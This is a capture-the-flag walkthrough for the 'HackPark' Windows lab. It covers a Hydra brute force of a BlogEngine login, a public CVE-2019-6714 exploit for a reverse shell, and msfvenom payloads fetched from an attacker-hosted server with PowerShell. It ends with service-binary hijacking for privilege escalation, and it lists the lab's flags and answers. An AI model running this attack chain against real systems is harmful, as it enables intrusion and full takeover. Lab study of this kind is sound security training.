# HackPark

> Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!


<br>

### Process:

1. Deploying the vulnerable Windows machine
	- name of the clown displayed = **pennywise**
2. Using Hydra to brute-force a login
	- type of request login form is making = **POST**
	- brute force form using hydra:
		- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.22.166 http-post-form "/Account/login.aspx:__VIEWSTATE=J7%2FrKT%2FRbzXElHvOFArr4HX0BUp05PUs%2Bjl4fN5QtFnsigr6tjwFZkWaUW9RaCNkl5wcaaA9I71WXBKsdywllsO45a8kdE%2BO2GeciLswYLZgMhEIYMOLKvVE1g9%2FuxmOjygsPrfW43YX1axgD3V%2FmbHd2lx7jcwje7Qgkp065G2LekTQ&__EVENTVALIDATION=nIJxL4rdGJE3KYMzFDmVH35CAPYLfmVh68KpFWCfpmOAp8i4dLgnYkYLVP3UEDV8IiIqX6kXoIwujnQvd7xTK1Tbiqg5RF0fYL3q6nazJk37P%2BrLs8lq043TvaeMwGi4uqTkx2onf8prQt9NNxgtS4oXE0haNUx6xQId8O8kqlZfYRAG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`
		- username/password = **admin:1qaz2wsx**
3. Compromise the machine:
	- login to machine 
	- version of BlogEngine running = **3.3.6.0**
	- CVE related to BlogEngine version = **CVE-2019-6714**
	- use public exploit to gain access to the server:
		- find exploit: `searchsploit BlogEngine`
		- mirror (copy) exploit: `searchsploit -m aspx/webapps/46353.cs`
		- read exploit and rename: `cp 46353.cs PostView.ascx`
		- edit line 51 (changing IP address and port to attacker listener)
		- follow exploit instructions:
			- a) upload file on the  `http://10.10.22.166/admin/app/editor/editpost.cshtml` page
			- b) setup listener on attacker
			- b) execute script by navigating to `http://10.10.22.166/?theme=../../App_Data/files` URL
4. Windows privilege escalation:
	- create msfvenom meterpreter palyoad:
		- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.140.3 LPORT=4444 -f exe -o shell.exe`
	- upload it to the victim machine via netcat shell:
		- on attacker: `python3 -m http.server 8080`
		- on target: `cd /Windows/Temp` -> `powershell -c wget "http://10.10.140.3:8080/shell.exe" -outfile "shell.exe"
		- on attacker: setup metasploit multi/handler
		- on target: execute shell with `shell.exe`
	- OS version of Windows machine = **Windows 2012 R2 (6.3 Build 9600)**
	- name of abnormal service running = **WindowsScheduler**
	- the name of the binary you're supposed to exploit = **Message.exe**
	- esclate privileges:
		- upload and execute winPEAS: `upload winPEAS.exe` -> `shell` -> `winPEAS.exe servicesinfo`
		- found writeable path at "C:\\Program Files (x86)\\SystemSchedular" with WService.exe calling for "Message.exe" in this directory 
		- create "Message.exe" payload:
			- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.140.3 LPORT=5555 -f exe -o shell.exe`
		- setup handler in metasploit
		- upload and overwrite the "Message.exe" file: `upload shell.exe Message.exe`
	- user flag:
		- `cd /users/jeff/desktop` -> `cat user.txt`
		- flag = **759bd8af507517bcfaede78a21a73e39**
	- root flag
		- `cd /users/administrator/desktop` -> `cat root.txt`
		- flag = **7e13d97f05f7ceb9881a3eb3d78d3e72**
5. Privilege esclation without Metasploit:
	- create a generic shell payload:
		- `msfvenom -p window/shell_reverse_tcp -f exe -o shell2.exe lhost=10.11.31.198 lport=6666`
	- upload to machine with PowerShell:
		- host on attacker machine: `python3 -m http.server 8080`
		- on target machine: `powershell -c "Invoke-WebRequest -Uri 'http://10.11.31.198:8080/shell2.exe' -OutFile 'C:\Windows\Temp\shell2.exe'"`
	- upload and execute winPEAS to target machine:
		- host on attacker machine: `python3 -m http.server 8080`
		- on target machine: `powershell -c "Invoke-WebRequest -Uri 'http://10.11.31.198:8080/winpeas.exe' -OutFile 'C:\Windows\Temp\winpeas.exe'"`
		- execute on target machine: `winpeas.exe`
	- original install time of system = **8/3/2019, 10:43:23 AM**
		- on target's shell: `systeminfo | findstr /i date`
	


